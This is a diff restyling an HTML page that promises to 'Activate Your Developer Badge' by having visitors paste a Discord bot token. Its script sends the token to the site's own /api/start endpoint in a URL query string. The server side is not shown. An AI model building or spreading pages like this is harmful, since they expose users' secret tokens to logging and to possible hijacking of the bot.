@@ -1,123 +1,243 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Start Discord Bot</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<head>
+  <meta charset="UTF-8" />
+  <title>Activate Your Developer Badge</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Discord embed meta tags -->
   <meta property="og:title" content="Start Your Discord Bot Instantly!" />
   <meta property="og:description" content="Paste your bot token and activate the Developer Badge." />
-  <meta property="og:image" content="https://yourdomain.com/assets/bot-thumbnail.png" /> <!-- Optional image -->
+  <meta property="og:image" content="https://yourdomain.com/assets/bot-thumbnail.png" /> <!-- Replace with your image -->
   <meta property="og:url" content="https://yourdomain.com" />
-  <meta name="theme-color" content="#5865F2" /> <!-- Discord blurple -->
-  
-  <style>
-    :root {
-      --accent: #5865F2;
-      --background: linear-gradient(135deg, #1e1e2f, #2f2f40);
-      --font: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
+  <meta name="theme-color" content="#5865F2" />
 
+  <style>
+    /* Background & stars from (1) */
     body {
       margin: 0;
-      padding: 0;
-      background: var(--background);
-      color: white;
-      font-family: var(--font);
+      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
+      background: radial-gradient(ellipse at bottom, #0d1b2a 0%, #000000 100%);
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: #ffffff;
+      min-height: 100vh;
       display: flex;
-      justify-content: center;
       align-items: center;
-      height: 100vh;
+      justify-content: center;
+      text-align: center;
       overflow: hidden;
+      user-select: none;
+      position: relative;
     }
 
+    .stars {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent url('https://www.transparenttextures.com/patterns/stardust.png') repeat;
+      background-size: contain;
+      z-index: 0;
+      animation: starScroll 500s linear infinite;
+    }
+
+    @keyframes starScroll {
+      from {
+        background-position: 0 0;
+      }
+
+      to {
+        background-position: 0 10000px;
+      }
+    }
+
+    /* Container & styling adapted from (1) + (2) */
     .container {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      z-index: 1;
+      background: rgba(20, 20, 40, 0.85);
+      padding: 40px 32px;
       border-radius: 20px;
-      padding: 40px;
-      max-width: 600px;
+      box-shadow:
+        0 8px 32px rgba(173, 216, 230, 0.15),
+        0 1.5px 8px rgba(138, 43, 226, 0.1);
+      max-width: 500px;
+      width: 100%;
+      animation: fadeIn 1.4s ease-out;
+      backdrop-filter: blur(8px);
+      position: relative;
+      transition: transform 0.25s cubic-bezier(.4, 0, .2, 1),
+        box-shadow 0.25s cubic-bezier(.4, 0, .2, 1);
       text-align: center;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
-      backdrop-filter: blur(10px);
-      animation: fadeIn 1s ease-out;
+      user-select: text;
+    }
+
+    .container:hover,
+    .container:focus-within {
+      transform: translateY(-12px) scale(1.015);
+      box-shadow:
+        0 16px 48px rgba(173, 216, 230, 0.3),
+        0 4px 24px rgba(138, 43, 226, 0.15);
     }
 
     h1 {
-      font-size: 2rem;
-      margin-bottom: 20px;
-      color: #ffffff;
+      font-size: 2.2rem;
+      color: #82b1ff;
+      margin-bottom: 24px;
+      text-shadow: 0 0 12px #1e88e580;
+      user-select: text;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      align-items: center;
+      user-select: text;
     }
 
     input {
-      padding: 12px;
+      padding: 12px 16px;
       width: 100%;
-      max-width: 400px;
-      border-radius: 8px;
+      max-width: 420px;
+      border-radius: 10px;
       border: none;
       outline: none;
-      margin-bottom: 20px;
       font-size: 1rem;
+      font-family: inherit;
+      background: rgba(255 255 255 / 0.1);
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+
+    input::placeholder {
+      color: #bbb;
+      font-style: italic;
+    }
+
+    input:focus {
+      background: rgba(255 255 255 / 0.2);
+      box-shadow: 0 0 10px #5865F2;
     }
 
     button {
-      background: var(--accent);
-      border: none;
+      background: linear-gradient(120deg, #00bcd4, #3f51b5, #7e57c2);
+      background-size: 300% 300%;
+      background-position: left center;
       color: white;
-      padding: 12px 24px;
-      font-size: 1rem;
-      border-radius: 8px;
+      border: none;
+      border-radius: 30px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      padding: 14px 36px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      box-shadow: 0 0 12px rgba(0, 188, 212, 0.6);
+      transition: transform 0.3s ease,
+        box-shadow 0.3s ease,
+        background-position 0.6s ease-in-out;
+      user-select: none;
+      width: 100%;
+      max-width: 420px;
     }
 
-    button:hover {
-      background: #4752c4;
+    button:hover,
+    button:focus {
+      background-position: right center;
+      transform: translateY(-2px) scale(1.05);
+      box-shadow: 0 0 24px rgba(0, 188, 212, 0.9);
+      outline: none;
     }
 
     #status {
-      margin-top: 20px;
-      font-size: 0.95rem;
-      background: rgba(0,0,0,0.2);
-      padding: 10px 20px;
-      border-radius: 10px;
+      margin-top: 24px;
+      font-size: 1rem;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 14px 24px;
+      border-radius: 14px;
       white-space: pre-wrap;
-      max-height: 200px;
+      max-height: 220px;
       overflow-y: auto;
+      color: #00ffab;
+      user-select: text;
+      font-family: Consolas, monospace, monospace;
+      text-align: left;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
   </style>
 </head>
+
 <body>
-  <div class="container">
+  <div class="stars"></div>
+
+  <main class="container" tabindex="0" role="main" aria-label="Activate Developer Badge form">
     <h1>Activate Your Developer Badge</h1>
-    <form onsubmit="start(event)">
-      <input id="token" type="text" placeholder="Paste your bot token here..." required />
-      <br />
-      <button type="submit">🚀 Start Bot</button>
+
+    <form onsubmit="start(event)" novalidate>
+      <input
+        id="token"
+        type="text"
+        placeholder="Paste your bot token here..."
+        aria-label="Discord Bot Token"
+        required
+        autocomplete="off"
+        spellcheck="false"
+      />
+      <button type="submit" aria-live="polite" aria-busy="false">🚀 Start Bot</button>
     </form>
-    <div id="status"></div>
-  </div>
+
+    <div id="status" aria-live="polite" aria-atomic="true" role="status"></div>
+  </main>
 
   <script>
     async function start(e) {
       e.preventDefault();
-      const token = document.getElementById('token').value;
+      const token = document.getElementById('token').value.trim();
       const status = document.getElementById('status');
-      status.innerText = '⌛ Bot running, Please wait...';
+      const button = e.target.querySelector('button');
+      if (!token) {
+        status.innerText = "⚠️ Please enter your bot token.";
+        return;
+      }
+
+      button.disabled = true;
+      button.setAttribute('aria-busy', 'true');
+      status.style.color = '#00ffab';
+      status.textContent = '⌛ Bot running, please wait...';
+
       try {
         const res = await fetch(`/api/start?token=${encodeURIComponent(token)}`);
         const text = await res.text();
-        status.innerText = text;
+
+        if (res.ok) {
+          status.style.color = '#00ffab';
+          status.textContent = text;
+        } else {
+          status.style.color = '#ff6f6f';
+          status.textContent = `❌ ${text}`;
+        }
       } catch (err) {
-        status.innerText = '❌ Failed to start bot. See console.';
+        status.style.color = '#ff6f6f';
+        status.textContent = '❌ Failed to start bot. See console for details.';
         console.error(err);
+      } finally {
+        button.disabled = false;
+        button.setAttribute('aria-busy', 'false');
       }
     }
   </script>
 </body>
+
 </html>
